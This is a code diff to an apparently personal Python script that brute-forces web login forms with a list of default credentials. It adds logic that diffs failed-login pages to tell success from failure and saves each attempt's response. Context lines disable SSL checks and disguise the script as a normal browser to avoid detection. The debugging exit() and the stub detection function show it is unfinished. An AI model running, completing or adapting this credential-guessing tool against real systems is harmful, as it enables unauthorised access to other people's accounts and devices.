@@ -24,9 +24,11 @@ user_agent = [
 username_keywords = ["username", "name"]
 password_keywords = ["password"]
 
+# Like above but for determining if a page is a failed login or a successful login
+login_failure_keywords = ["incorrect", "login failed", "invalid"]
 
 # Disables SSL verificaton, this is a security risk and makes the script vulernable to MiTM and false-host
-# attacks.
+# attacks
 ssl._create_default_https_context = ssl._create_unverified_context
 
 # Change some settings so it's not super-clear that we're an automated script.
@@ -73,11 +75,42 @@ br.form = login_form
 with open("default_passwords.txt", 'r') as opn:
     default_passwords = opn.readlines()
 
-# Where we'll store all the HTML we get back from trying passwords
-results = []
+# We need to gather some example failure, so we can determine what parts of the page are just always
+# different (Like time stamps, or amazon web services links)
+example_failures = [] # this is also the name of my autobiography
 
-# Add a first bogus result, so we know what the page looks like when we fail to log in
-results.append(try_username_password(br, username_control, password_control, "rtryearaernguio", "asdhuilaubefaefa")) # intellectual
+br.form = login_form # reselect the form each time
+example_failures.append(
+    try_username_password(br, username_control, password_control, "rtryearaernguio", "asdhuilaubefaefa").read().replace("rtryearaernguio", '').replace("asdhuilaubefaefa", '')
+    )
+
+br.form = login_form # reselect the form each time
+example_failures.append(
+    try_username_password(br, username_control, password_control, "sasdaksjdlkguio", "jsdlkjlieaefaefa").read().replace("sasdaksjdlkguio", '').replace("jsdlkjlieaefaefa", '')
+    ) 
+
+ex1 = example_failures[0].split("\n")
+ex2 = example_failures[1].split("\n")
+delta_lines = []
+
+for i in ex1:
+    for k in ex2:
+        if not k in i:
+            delta_lines.append(k)
+        if not i in k:
+            delta_lines.append(i)
+   
+print(delta_lines)
+exit()
+
+# Removes the delta lines (from above) from a page, so we can compare it to other login attempts more accurately
+def clean_delta_lines(page):
+    for i in delta_lines:
+        page = page.replace(i, '')
+    return page 
+
+# Where we'll store all the HTML we get back from trying passwords
+results = [example_failures[0]] # start with a failed attempt, so we don't log failures
 
 # Try them all lol
 for i in default_passwords:
@@ -85,8 +118,18 @@ for i in default_passwords:
     username, password = i.split(" ") if len(i.split(" ")) == 2 else (i, "")
     print(username, password)
     br.form = login_form # reselect the form each time
-    res = try_username_password(br, username_control, password_control, username, password)
+    res = try_username_password(br, username_control, password_control, username, password).read().replace(username, '').replace(password, '')
+    res = clean_delta_lines(res)
     if not res in results:
         results.append(res)
+
+    opn = open("readout/"+username+password, 'w')
+    opn.write(res)
+    opn.close()
+
+# Will take a string of HTML and try to determine if it's a successful login page
+def determine_page_login_success(page):
+    for i in login_failure_keywords:
+        pass
 
 print(len(results))
